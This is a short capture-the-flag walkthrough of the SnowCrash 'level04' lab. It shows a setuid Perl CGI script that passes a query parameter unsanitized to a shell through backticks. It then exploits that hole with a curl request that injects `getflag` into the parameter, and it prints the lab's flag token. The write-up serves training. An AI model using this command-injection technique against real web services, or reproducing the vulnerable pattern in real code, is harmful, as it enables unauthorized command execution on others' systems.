## step 1
Logged in as `level04`. The home directory contains:

```
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```
level04.pl is a setuid Perl script, owned by flag04, meaning it runs with flag04 privileges when executed.
## step 2

Using strings to inspect the Perl script:
```
level04@SnowCrash:~$ strings level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

```
After reading perl's script :

1- It sets up a basic CGI web server.

2 - It takes user input from a query string parameter x and passes it unsanitized to a shell using backticks: `echo $y`.
##  step 3
Use curl to Exploit
```
level04@SnowCrash:~$ curl 'http://localhost:4747?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

```

